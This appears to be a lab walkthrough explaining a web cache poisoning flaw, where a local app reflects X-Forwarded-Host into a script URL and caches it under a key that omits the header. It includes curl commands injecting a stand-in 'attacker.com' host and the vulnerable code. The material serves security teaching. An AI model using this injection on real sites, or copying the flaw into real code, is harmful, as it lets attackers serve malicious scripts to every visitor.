# Finding the Bug

## Two Problems in One Endpoint

The `/home` endpoint in `lab/app.py` has two related bugs:

**Bug 1:** `X-Forwarded-Host` is reflected without validation.

```python
forwarded_host = request.headers.get('X-Forwarded-Host', request.host)
body = {
    'script_src': f'http://{forwarded_host}/static/app.js',
    ...
}
```

The header is taken from the request and embedded directly into the response. Any value the attacker sends appears in `script_src`.

**Bug 2:** The cache key does not include `X-Forwarded-Host`.

```python
cache_key = 'GET:/home'
cached_body, cached_headers = cache_get(cache_key)
if cached_body:
    return Response(cached_body, ...)

# ... build response using X-Forwarded-Host ...
cache_set(cache_key, body_str, {})
```

The cache stores and retrieves by `'GET:/home'` only. The `X-Forwarded-Host` header is not in the key.

## Confirming the Reflection

Send a request with a custom `X-Forwarded-Host`:

```bash
curl -s -H "X-Forwarded-Host: attacker.com" http://127.0.0.1:8094/home
```

Output:

```json
{"script_src": "http://attacker.com/static/app.js", ...}
```

The header value appears in the response.

## Confirming the Cache Poisoning

After the request above, send another request without the header:

```bash
curl -s -D - http://127.0.0.1:8094/home
```

The response header shows `X-Cache: HIT` and the body still contains `attacker.com`. The cache serves the poisoned response to anyone who requests `/home`.

Use `/cache/stats` to see the cache state:

```bash
curl -s http://127.0.0.1:8094/cache/stats
# {"entries": [{"key": "GET:/home", "age_s": 3.1}]}
```
